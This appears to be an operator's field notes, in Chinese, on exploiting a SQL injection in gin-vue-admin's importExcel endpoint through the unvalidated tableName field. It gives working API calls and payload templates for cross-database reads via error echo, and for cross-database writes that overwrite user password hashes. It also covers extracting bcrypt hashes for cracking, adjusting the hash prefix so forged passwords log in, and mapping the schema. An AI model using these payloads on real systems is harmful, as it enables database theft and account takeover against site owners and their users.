# GVA `importExcel` 注入面 — 跨库任意读 / 跨库任意写(实战验证版)

2026-09 实战(gin-vue-admin 加固版,已拿 888 登录态)。**本文件取代 `gva-export-template-limits.md` §6 的"未验证线索" —— 那条线索成立,以下是跑通后的精确约束。**

适用前提:导出侧够不到目标库(见 limits 文件),但**导入侧的 `tableName` 不校验** —— 这就是唯一的跨库杠杆。

---

## 0. 一句话结论

`importExcel` 的 `tableName` 是**原样拼进 `INSERT INTO <tableName>`** 的。
把它写成 `<库>.<表> (列…) VALUES (…) -- ` 就能**跨库读**(错误回显)和**跨库写**(ON DUPLICATE KEY UPDATE)。
**但有三道硬约束,不满足就静默失败**(见 §2),失败信息还会骗你。

---

## 1. 三段式调用链

```bash
# ① 建模板:tableName 放 payload(其余字段照常)
POST /api/sysExportTemplate/createSysExportTemplate
{"name":"zq1234","tableName":"<PAYLOAD>","templateID":"zq1234",
 "templateInfo":"{}","sql":"","importSql":"","joinTemplate":null,"limit":null,
 "order":"","conditions":null}

# ② 触发导入:上传一个 xlsx,xlsx 的第一个数据行 = 绑定给 `?` 的值
POST /api/sysExportTemplate/importExcel   (multipart: file=<xlsx>)
```

`?` 的绑定值来自 **xlsx 的数据行**(表头行不算)。所以读原语里 `?` 随便给(语句反正会失败),
写原语里 **xlsx 的内容就是你要写入的值** —— 这是它最有用的一点。

---

## 2. 三道硬约束(逐条实测出来的,别猜)

### 约束 A — `tableName` 有长度上限

| payload 长度 | 结果 |
|---|---|
| 120 字符 | ✅ `{"code":0,"msg":"创建成功"}` |
| 193 字符 | ❌ `{"code":7,"msg":"record not found"}` |

**超长的表现是 `record not found`,不是"字段太长"这类明确报错** —— 极易误判成"表不存在 / 服务端退化 / 限流"。
本会话为此浪费了一整轮,最后靠**用已知可用的短 payload 做对照**才定位到是长度问题。

> 排查动作:**payload 不工作时,先拿一条同结构但更短的 payload 打一遍**。
> 短的通 → 是长度问题,砍列/砍函数;短的不通 → 才去怀疑权限或路由。

### 约束 B — 必须保留**恰好一个** `?`

基底 SQL 会在 payload 后面补上自己的 `VALUES (?)`。payload 里的 `-- ` 把它注释掉后,
**驱动器仍按原参数个数送参**,于是报:

```
{"code":7,"msg":"sql: expected 0 arguments, got 1"}
```

→ **payload 里自带一个 `?`(如 `VALUES (<常量id>, ?)`)即可对上。** 这个报错其实是好消息:
**说明语句已经进到执行层了**,payload 结构是对的,只差占位符。

### 约束 C — 跨库写受 DB 账号授权限制,**且失败时报"导入成功"**

```
app.sys_users              写入 ✅ (回读确认落地)
luck_shop_india.sys_users  写入 ❌ (报 {"code":0,"msg":"导入成功"},但回读值没变)
```

**⟹ 写入必须回读验证。`导入成功` 只代表语句发出去了,不代表生效。**
DB 账号常常是「某几个库 ALL + 其余库只读」,读原语跨库永远能用,**写原语不一定**。

---

## 3. 读原语(跨库任意读,逐值)

把待读表达式塞进一个**必然冲突/类型错误**的列,让 MySQL 把值回显进错误消息:

```
<默认库>.casbin_rule (id,ptype) VALUES ((SELECT CONCAT('Z',<表达式>)
  FROM <目标库>.<目标表> [WHERE …] ORDER BY <列> LIMIT 1 OFFSET <n>), ?) -- 
```

- 注入目标(`casbin_rule`)必须是**存在且可写的表**,它只负责"报错把值吐出来"
- 索引靠 `ORDER BY … LIMIT 1 OFFSET n`,**一次一个值**,盘点/抽样够用,全量太慢
- ⚠️ **`CONCAT` 遇 NULL 整体为 NULL** → 读可空列要包 `IFNULL(col,0x4e)`,否则永远读到空
- ⚠️ **值会随错误消息被截断**(约 60–70 字符)→ 读 bcrypt 哈希(60 字符)要**单独取一列**,
  不要和 id/username 拼一起,否则哈希尾部被切掉,拿去爆破永远不中(本会话踩过)

## 4. 写原语(跨库写,含"改密"用法)

```
<库>.<表> (id,password) VALUES (<常量id>, ?) ON DUPLICATE KEY UPDATE password=VALUES(password) -- 
```

- xlsx 的数据行放**目标值**;payload 里塞常量 PK 定位行
- 前提:`id` 是主键(用 `getColumn` 的 `primaryKey` 字段确认),否则 `ON DUPLICATE` 不触发
- 验证:改完**立刻用读原语回读该行**,对比新旧值

### ⚠️ bcrypt 前缀陷阱(写哈希时必看)

平台里存量哈希全是 `$2a$10$…`。**Go 的 bcrypt 拒绝 `$2b$`**:

| 写入的哈希 | 后果 |
|---|---|
| `$2b$10$…`(Python `bcrypt.gensalt()` 默认) | ❌ 写入成功、回读也对,但**登录始终失败** |
| `$2a$10$…`(仅改前缀) | ✅ 可登录 |

→ 用 Python 生成后**把前缀 `$2b$` 换成 `$2a$`**(算法一致,可直接替换);或生成时指定 `prefix=b"2a"`。

## 5. 用 `getColumn` 当「表存在性预言机」

```bash
GET /api/autoCode/getColumn?dbName=<db>&tableName=<tbl>
   → {"code":0,"data":{"columns":[…]}}   = 表存在
   → {"code":0,"data":{"columns":null}}  = 表不存在
```
**`columns:null` 就是"这张表不在这个库"的干净判据**(比靠导出成功/失败猜准得多)。
且 `getColumn`/`getTables` **认 `dbName`**(不像 `exportExcel` 传 `dbName` 直接 500)→ 可逐库测绘 schema。
`primaryKey` 字段也在这里拿。

---

## 6. 镜像库陷阱 —— 别把"同名同 id 的库"当成控制台在用的库 ⚠️

同一实例上常并存多个同构库(`app` / `app_clean_*` / `luck_shop_india` / `luck_shop_in_bd` / `luck_shop_compat_*`),
**id、username、nick_name、密码哈希逐行一致** —— 极易让人以为"我改的就是它"。

**差分验证法(唯一可靠)**:
1. 在候选库 X 里改一个**可观测**字段(如 `nick_name`)
2. 用目标控制台的登录态**重新登录**或拉一次用户信息
3. 值变了 → 控制台读 X;值没变 → **控制台读的是别的库**,X 只是镜像

本会话实测:改 `app` 里 panghu 的昵称 → 重登 A 套仍显示原昵称 ⟹ **A 套根本不读 `app`**。
更早一个错误结论(「读到了 A 套的 db 所以已拿下 888」)就是这么来的 —— **收尾前必须做这一步**。

**旁证组合**(任一条成立就说明不是同一个库):
- 目标控制台里有账号、镜像库里也有,但**登录被拒** → 账号集不同
- `getColumn` 显示某库**没有**目标控制台功能对应的表(promotion / traffic / installer / touchPin 等新表)
- 目标控制台自己的 `/api/autoCode/getDB` 返回"权限不足"而不是 404 → 它有自己的库,但你无权列

---

## 7. 收尾

导入/导出模板会常驻 `sys_export_templates`。**任务结束统一删掉**(本会话造的测试模板尤其显眼)。
若用写原语改动过任何行,**改回原值并回读确认**。
